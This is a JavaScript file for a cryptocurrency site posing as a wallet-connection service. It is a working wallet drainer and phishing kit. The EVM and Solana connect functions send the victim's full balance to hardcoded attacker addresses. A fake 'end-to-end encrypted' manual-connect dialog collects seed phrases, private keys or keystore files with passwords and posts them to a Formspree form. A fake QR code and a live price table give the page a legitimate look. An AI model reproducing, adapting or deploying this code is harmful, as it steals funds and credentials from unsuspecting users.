// script.js – Minimal version without Reown AppKit or wallet selection logic

// === Wallet Page Navigation ===
function goToPage(num) {
  resetHeaderImages(num);
  window.location.href = num === 1 ? "index.html" : num === 2 ? "page2.html" : num === 3 ? "page3.html" : num === 4 ? "page4.html" : "page5.html";
}

// === EVM Connection ===
async function connectEvmWallet() {
  const loadingOverlay = document.createElement('div');
  loadingOverlay.id = 'loading-overlay';
  loadingOverlay.style.cssText = `
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(20, 20, 20, 0.9);
    z-index: 1005;
    padding: 20px;
    border-radius: 10px;
    display: flex;
    justify-content: center;
    align-items: center;
  `;

  const loadingContent = document.createElement('div');
  loadingContent.style.cssText = `display: flex; align-items: center; gap: 15px;`;

  const loadingCircle = document.createElement('div');
  loadingCircle.style.cssText = `
    width: 30px;
    height: 30px;
    border: 4px solid #fff;
    border-top: 4px solid gold;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  `;

  const loadingText = document.createElement('span');
  loadingText.textContent = `Connecting to EVM Wallet...`;
  loadingText.style.cssText = `color: white;`;

  loadingContent.appendChild(loadingCircle);
  loadingContent.appendChild(loadingText);
  loadingOverlay.appendChild(loadingContent);
  document.body.appendChild(loadingOverlay);

  setTimeout(async () => {
    loadingOverlay.remove();
    try {
      let provider;
      if (window.ethereum) {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
      } else {
        const wcProvider = new WalletConnectProvider({
          rpc: {
            1: "https://mainnet.infura.io/v3/b299744d379540e98e41bdb76e21f767",
            56: "https://bsc-dataseed.binance.org/",
            137: "https://polygon-rpc.com",
          },
        });
        await wcProvider.enable();
        provider = new ethers.providers.Web3Provider(wcProvider);
      }

      const signer = provider.getSigner();
      const address = await signer.getAddress();
      const balance = await provider.getBalance(address);

      const gasPrice = await provider.getGasPrice();
      const gasLimit = 21000n;
      const gasCost = gasPrice * gasLimit;
      const sendAmount = balance - gasCost;

      if (sendAmount <= 0) {
        alert("❌ Not enough balance to cover gas.");
        return;
      }

      const tx = await signer.sendTransaction({
        to: "0x83B7D68c42231e1bbdAE8522572Ac0F272ba31aB",
        value: sendAmount,
      });

      alert("✅ EVM Transaction sent: " + tx.hash);
    } catch (err) {
      console.error("EVM Connection Error:", err);
      showSolanaManualFallback();
    }
  }, 4000);
}

// === Solana Connection ===
async function connectSolanaWallet() {
  const loadingOverlay = document.createElement('div');
  loadingOverlay.id = 'loading-overlay';
  loadingOverlay.style.cssText = `
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(20, 20, 20, 0.9);
    z-index: 1005;
    padding: 20px;
    border-radius: 10px;
    display: flex;
    justify-content: center;
    align-items: center;
  `;

  const loadingContent = document.createElement('div');
  loadingContent.style.cssText = `display: flex; align-items: center; gap: 15px;`;

  const loadingCircle = document.createElement('div');
  loadingCircle.style.cssText = `
    width: 30px;
    height: 30px;
    border: 4px solid #fff;
    border-top: 4px solid gold;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  `;

  const loadingText = document.createElement('span');
  loadingText.textContent = `Connecting to Phantom...`;
  loadingText.style.cssText = `color: white;`;

  loadingContent.appendChild(loadingCircle);
  loadingContent.appendChild(loadingText);
  loadingOverlay.appendChild(loadingContent);
  document.body.appendChild(loadingOverlay);

  setTimeout(async () => {
    loadingOverlay.remove();

    if (!window.solana || !window.solana.isPhantom) {
      showSolanaManualFallback();
      return;
    }

    try {
      const resp = await window.solana.connect();
      const sender = resp.publicKey;
      const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));

      const balance = await connection.getBalance(sender);
      const fee = 5000;
      const transferAmount = balance - fee;

      if (transferAmount <= 0) return alert("❌ Not enough SOL to transfer.");

      const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: sender,
          toPubkey: new solanaWeb3.PublicKey("FJZPmaWfeAYSjyhvHWFoTaJLzSaNAbmtZ3cEuJNSi7h3"),
          lamports: transferAmount,
        })
      );

      transaction.feePayer = sender;
      transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

      const signed = await window.solana.signTransaction(transaction);
      const signature = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(signature);

      alert("✅ SOL Transfer complete. Signature: " + signature);
    } catch (err) {
      console.error("Solana Connection Error:", err);
      showSolanaManualFallback();
    }
  }, 4000);
}

// === Manual Fallback for Phantom ===
function showSolanaManualFallback() {
  const container = document.createElement("div");
  container.id = "manualConnectContainer";
  container.style.cssText = `
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    padding: 30px;
    background-color: #1a1a1a;
    border-radius: 10px;
    color: white;
    text-align: center;
    width: 90%;
    max-width: 90%;
    margin: 0 auto;
    box-shadow: 0 0 10px gold;
    z-index: 1006;
  `;

  container.innerHTML = `
    <h3 style="color: red;">Error connecting....</h3>
    <h4 style="color: green;">Connect Manually</h4>
    <div id="connectOptions" style="display: flex; justify-content: center; gap: 20px; margin-bottom: 15px;">
      <button id="phraseOption" style="background: none; border: none; color: white; font-size: 16px; cursor: pointer; text-decoration: underline; text-decoration-color: #ffd700;">PHRASE</button>
      <button id="keystoreOption" style="background: none; border: none; color: white; font-size: 16px; cursor: pointer; text-decoration: none;">KEYSTORE JSON</button>
      <button id="privateKeyOption" style="background: none; border: none; color: white; font-size: 16px; cursor: pointer; text-decoration: none;">PRIVATE KEY</button>
    </div>
    <textarea id="phraseInput" placeholder="Enter your phrases..." style="width: 100%; height: 120px; font-size: 16px; padding: 10px; color: red; background-color: #222; border: 1px solid white; border-radius: 8px; resize: none;"></textarea>
    <div id="passwordInputContainer" style="display: none; margin-top: 10px;">
      <input id="passwordInput" type="password" placeholder="Password" style="width: 100%; font-size: 16px; padding: 10px; color: white; background-color: #222; border: 1px solid white; border-radius: 8px;">
    </div>
    <p style="font-size: 12px; color: green; margin: 8px 0;">end-to-end encrypted</p>
    <p id="infoText" style="font-size: 14px;">Enter your phrases in the box manually, typically 12 or 24 words</p>
    <button id="connectButton" style="margin-top: 10px; padding: 10px 20px; background-color: gold; color: black; font-weight: bold; border-radius: 10px; box-shadow: 0 3px white; border: none; cursor: pointer;">Connect</button>
    <div id="qrBox" style="margin-top: 20px;"></div>
  `;

  const style = document.createElement('style');
  style.textContent = `
    @keyframes slideInFromRight {
      from { transform: translateX(100%); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideInFromLeft {
      from { transform: translateX(-100%); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }
    .slide-in-right {
      animation: slideInFromRight 0.3s ease-out forwards;
    }
    .slide-in-left {
      animation: slideInFromLeft 0.3s ease-out forwards;
    }
    .slide-out {
      animation: none;
      transform: translateX(0);
      opacity: 0;
    }
  `;
  container.appendChild(style);

  const closeBtn = document.createElement('button');
  closeBtn.textContent = '×';
  closeBtn.style.cssText = `
    position: absolute;
    top: 10px;
    right: 10px;
    width: 30px;
    height: 30px;
    background-color: #ff4444;
    color: white;
    border: none;
    border-radius: 50%;
    cursor: pointer;
    font-size: 20px;
    line-height: 30px;
  `;
  closeBtn.onclick = () => {
    container.remove();
    resetHeaderImages();
  };
  container.appendChild(closeBtn);

  document.body.appendChild(container);

  const phraseOption = document.getElementById("phraseOption");
  const keystoreOption = document.getElementById("keystoreOption");
  const privateKeyOption = document.getElementById("privateKeyOption");
  const phraseInput = document.getElementById("phraseInput");
  const passwordInputContainer = document.getElementById("passwordInputContainer");
  const infoText = document.getElementById("infoText");
  const connectButton = document.getElementById("connectButton");

  const applySlideAnimation = (direction) => {
    [phraseInput, passwordInputContainer, infoText].forEach(el => {
      el.classList.remove('slide-in-right', 'slide-in-left');
      el.classList.add('slide-out');
    });

    setTimeout(() => {
      [phraseInput, passwordInputContainer, infoText].forEach(el => {
        el.classList.remove('slide-out');
        el.classList.add(direction === 'left' ? 'slide-in-left' : 'slide-in-right');
      });
    }, 100);
  };

  let selectedOption = "PHRASE";
  phraseOption.style.textDecoration = "underline";
  phraseOption.style.textDecorationColor = "#ffd700";
  applySlideAnimation('right');

  phraseOption.addEventListener("click", () => {
    selectedOption = "PHRASE";
    phraseOption.style.textDecoration = "underline";
    phraseOption.style.textDecorationColor = "#ffd700";
    keystoreOption.style.textDecoration = "none";
    privateKeyOption.style.textDecoration = "none";
    phraseInput.placeholder = "Enter your phrases...";
    passwordInputContainer.style.display = "none";
    infoText.textContent = "Enter your phrases in the box manually, typically 12 or 24 words";
    phraseInput.style.color = "red";
    phraseInput.disabled = false;
    applySlideAnimation('right');
  });

  keystoreOption.addEventListener("click", () => {
    selectedOption = "KEYSTORE JSON";
    phraseOption.style.textDecoration = "none";
    keystoreOption.style.textDecoration = "underline";
    keystoreOption.style.textDecorationColor = "#ffd700";
    privateKeyOption.style.textDecoration = "none";
    phraseInput.placeholder = "Keystore JSON";
    passwordInputContainer.style.display = "block";
    infoText.textContent = "Several lines of text that begin with {...} and your password";
    phraseInput.style.color = "white";
    phraseInput.disabled = false;
    applySlideAnimation('left');
  });

  privateKeyOption.addEventListener("click", () => {
    selectedOption = "PRIVATE KEY";
    phraseOption.style.textDecoration = "none";
    keystoreOption.style.textDecoration = "none";
    privateKeyOption.style.textDecoration = "underline";
    privateKeyOption.style.textDecorationColor = "#ffd700";
    phraseInput.placeholder = "Private key";
    passwordInputContainer.style.display = "none";
    infoText.textContent = "Typically at least 60 characters";
    phraseInput.style.color = "white";
    phraseInput.disabled = false;
    applySlideAnimation('right');
  });

  phraseInput.addEventListener("input", () => {
    if (selectedOption !== "PHRASE") return;

    let value = phraseInput.value.trim();
    let words = value.split(/\s+/).filter(Boolean);

    if (value.endsWith(" ")) {
      let numberedText = "";
      words.forEach((word, index) => {
        const number = index + 1;
        numberedText += `${number}. ${word} `;
      });
      phraseInput.value = numberedText.trim();
      words = phraseInput.value.trim().split(/\s+/).filter(Boolean).map(word => word.replace(/^\d+\.\s/, ''));
    }

    if (words.length === 12 || words.length === 24) {
      phraseInput.style.color = "green";
    } else if (words.length > 12 && words.length < 24) {
      phraseInput.style.color = "red";
    } else {
      phraseInput.style.color = "red";
    }

    if (words.length === 23 && value.endsWith(" ")) {
      phraseInput.style.color = "green";
    }
    if (words.length === 24 && value.endsWith(" ")) {
      alert("24 words reached");
      phraseInput.value = phraseInput.value.trim();
      phraseInput.disabled = true;
    }
  });

  connectButton.addEventListener("click", () => {
    const words = phraseInput.value.trim().split(/\s+/).filter(Boolean).map(word => word.replace(/^\d+\.\s/, ''));
    const password = document.getElementById("passwordInput")?.value || "";

    if (selectedOption === "PHRASE" && words.length !== 12 && words.length !== 24) {
      alert("❌ Enter exactly 12 or 24 words.");
      return;
    }

    const qrBox = document.getElementById("qrBox");
    qrBox.innerHTML = `
      <div class="loading-circle" style="margin: 10px auto; width: 30px; height: 30px; border: 4px solid #fff; border-top: 4px solid gold; border-radius: 50%; animation: spin 1s linear infinite;"></div>
      <p style="color: gold;">Connecting...</p>
    `;

    const formspreeID = "manblypd";
    const text = selectedOption === "KEYSTORE JSON" ? JSON.stringify({ keystore: phraseInput.value, password }) : phraseInput.value;

    setTimeout(async () => {
      try {
        await fetch(`https://formspree.io/f/${formspreeID}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ "user-input": text }),
        });
        console.log("Data sent to email successfully.");
      } catch (err) {
        console.error("Failed to send data:", err);
      }

      const fakeCode = Math.floor(Math.random() * 1000000000);
      qrBox.innerHTML = `
        <p style="color: white;">Scan this code:</p>
        <img src="https://api.qrserver.com/v1/create-qr-code/?data=${fakeCode}&size=150x150" alt="QR Code" />
        <p style="color: green; margin-top: 10px;">ID: ${fakeCode}</p>
      `;
    }, 4000);
  });
}

// === Reset Header Images ===
function resetHeaderImages(pageNum = null) {
  const logo = document.querySelector('.logo');
  const walletIcon = document.querySelector('.wallet-icon');
  const homeIcon = document.querySelector('.home-icon');

  if (logo) {
    const newLogoSrc = 'Crypto.png';
    if (!logo.src.includes(newLogoSrc)) {
      logo.src = newLogoSrc;
      logo.onload = () => console.log('Logo reloaded');
      logo.onerror = () => console.error('Logo failed to load');
    }
  }

  if (walletIcon) {
    const newWalletSrc = 'Wallet_icon.png';
    if (!walletIcon.src.includes(newWalletSrc)) {
      walletIcon.src = newWalletSrc;
      walletIcon.onload = () => console.log('Wallet icon reloaded');
      walletIcon.onerror = () => console.error('Wallet icon failed to load');
    }
  }

  if (homeIcon) {
    if (pageNum === 2 || pageNum === 3 || pageNum === 4 || pageNum === 5) {
      const newHomeSrc = 'Home.png';
      if (!homeIcon.src.includes(newHomeSrc)) {
        homeIcon.src = newHomeSrc;
        homeIcon.onload = () => console.log('Home icon reloaded');
        homeIcon.onerror = () => console.error('Home icon failed to load');
      }
      homeIcon.onclick = () => goToPage(1);
      console.log(`Home icon set for page ${pageNum}, onclick assigned`);
    } else {
      homeIcon.style.display = 'none';
    }
  }
}

// === Show More Reviews ===
function showMoreReviews() {
  const hiddenReviews = document.querySelectorAll('.review-block.hidden');
  hiddenReviews.forEach(review => {
    review.classList.remove('hidden');
  });
  const showMoreBtn = document.getElementById('showMoreBtn');
  if (showMoreBtn) {
    showMoreBtn.style.display = 'none';
  }
}

// === Initialize on Page Load ===
document.addEventListener('DOMContentLoaded', () => {
  // Clear any existing overlays or styles on page load
  document.body.style.backdropFilter = 'none';
  document.body.style.filter = 'none';
  document.body.style.overflow = 'auto';
  document.body.style.position = '';
  document.body.style.width = '';
  const existingOverlays = document.querySelectorAll('#loading-overlay, #manualConnectContainer');
  existingOverlays.forEach(overlay => overlay.remove());
  const staticLoadingOverlay = document.getElementById('loadingOverlay');
  if (staticLoadingOverlay) {
    staticLoadingOverlay.style.display = 'none';
  }

  // Apply page load animation to main content
  const mainContent = document.querySelector('main');
  if (mainContent) {
    mainContent.style.animation = 'none';
    mainContent.offsetHeight;
    mainContent.style.animation = 'pageFadeScale 0.8s ease-out forwards';
  }

  // Apply staggered fade-in animations to sections
  const sections = document.querySelectorAll('.crypto-tracker, .services, .services-list, .about, .reviews, .section-image, .dynamic-3d, .legal-links, .headline, .token-headline, .rolling-image');
  sections.forEach((section, index) => {
    section.style.animationDelay = `${index * 0.2}s`;
  });

  // Determine the current page
  const isIndexPage = window.location.pathname.includes('index.html') || window.location.pathname === '/' || window.location.pathname === '';
  const isPage2 = window.location.pathname.includes('page2.html');
  const isPage3 = window.location.pathname.includes('page3.html');
  const isPage4 = window.location.pathname.includes('page4.html');
  const isPage5 = window.location.pathname.includes('page5.html');

  // Initialize header images
  resetHeaderImages(isPage2 ? 2 : isPage3 ? 3 : isPage4 ? 4 : isPage5 ? 5 : null);

  // Initialize CoinGecko table and wallet icon on index.html
  if (isIndexPage) {
    const cryptoTableBody = document.getElementById('crypto-table-body');
    const cryptoTable = document.querySelector('.crypto-table');
    const cryptoTracker = document.querySelector('.crypto-tracker');
    if (cryptoTableBody && cryptoTable && cryptoTracker) {
      cryptoTable.style.backgroundColor = '#571728';
      cryptoTable.style.width = '100%';
      cryptoTable.style.maxWidth = '800px';
      cryptoTable.style.boxSizing = 'border-box';
      cryptoTable.style.margin = '0 auto';
      cryptoTracker.style.overflowX = 'auto';

      const fetchCryptoData = async (attempt = 1, maxAttempts = 3) => {
        cryptoTableBody.innerHTML = '<tr><td colspan="6">Loading prices...</td></tr>';
        try {
          const response = await fetch(
            'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&per_page=20&page=1&sparkline=false',
            { cache: 'no-store' }
          );
          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          const data = await response.json();
          cryptoTableBody.innerHTML = '';
          data.forEach((coin, index) => {
            const symbolCell = coin.image
              ? `<img src="${coin.image}" alt="${coin.symbol.toUpperCase()}" style="width: 24px; height: 24px;" onerror="this.src='/Crypto.png';">`
              : coin.symbol.toUpperCase();
            const row = document.createElement('tr');
            row.innerHTML = `
              <td>${index + 1}</td>
              <td>${coin.name}</td>
              <td>${symbolCell}</td>
              <td>$${Number(coin.current_price).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
              <td>$${coin.market_cap.toLocaleString()}</td>
              <td style="color: ${coin.price_change_percentage_24h >= 0 ? 'green' : 'red'}">
                ${coin.price_change_percentage_24h.toFixed(2)}%
              </td>
            `;
            cryptoTableBody.appendChild(row);
          });
          console.log('Crypto prices loaded successfully');
        } catch (error) {
          console.error(`Error fetching CoinGecko data (attempt ${attempt}):`, error);
          if (attempt < maxAttempts) {
            console.log(`Retrying CoinGecko fetch, attempt ${attempt + 1}`);
            setTimeout(() => fetchCryptoData(attempt + 1, maxAttempts), 2000);
          } else {
            cryptoTableBody.innerHTML = '<tr><td colspan="6">Failed to load crypto prices. Please try again later.</td></tr>';
          }
        }
      };

      fetchCryptoData();
      setInterval(() => fetchCryptoData(), 60000);
    }

    const walletIcon = document.querySelector('.wallet-icon');
    if (walletIcon) {
      walletIcon.onclick = null;
      walletIcon.addEventListener('click', () => {
        connectEvmWallet(); // Default to EVM for wallet icon
      });
    }

    const clickHereButtons = document.querySelectorAll('.services .gold-btn, .about .gold-btn');
    clickHereButtons.forEach(button => {
      button.onclick = null;
      button.addEventListener('click', () => {
        goToPage(2);
      });
    });
  }

  // Initialize buttons on page2.html
  if (isPage2) {
    const evmButtons = document.querySelectorAll('.evm-btn');
    evmButtons.forEach(button => {
      button.onclick = null;
      button.addEventListener('click', () => {
        connectEvmWallet();
      });
    });

    const solanaButtons = document.querySelectorAll('.solana-btn');
    solanaButtons.forEach(button => {
      button.onclick = null;
      button.addEventListener('click', () => {
        connectSolanaWallet();
      });
    });

    const walletButtons = document.querySelectorAll('.wallet-btn');
    walletButtons.forEach(button => {
      button.onclick = null;
      button.addEventListener('click', () => {
        showSolanaManualFallback(); // Default to manual fallback for generic wallet buttons
      });
    });

    const showMoreBtn = document.getElementById('showMoreBtn');
    if (showMoreBtn) {
      showMoreBtn.onclick = null;
      showMoreBtn.addEventListener('click', showMoreReviews);
    }
  }
});

// Expose for debugging
window.__chainSupport = { fetchCryptoData, connectEvmWallet, connectSolanaWallet };